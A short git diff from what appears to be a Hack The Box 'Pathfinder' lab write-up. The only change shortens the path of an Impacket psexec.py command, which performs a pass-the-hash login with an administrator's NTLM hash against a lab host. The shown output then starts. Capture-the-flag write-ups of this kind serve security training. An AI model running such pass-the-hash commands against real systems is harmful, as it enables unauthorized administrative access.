@@ -150,7 +150,7 @@ PATHFINDER$:des-cbc-md5:0d37bfbcb5014f89
 With Impacket's psexec.py I am able to use the admin's NTLM hash in a PTH attack to gain elevated access to the system.  
 ~~~Bash
 ┌──(jessi㉿teatimesec)-[~/HTB/Pathfinder]
-└─$ python3 ~/scripts/psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+└─$ psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Requesting shares on 10.10.10.30.....
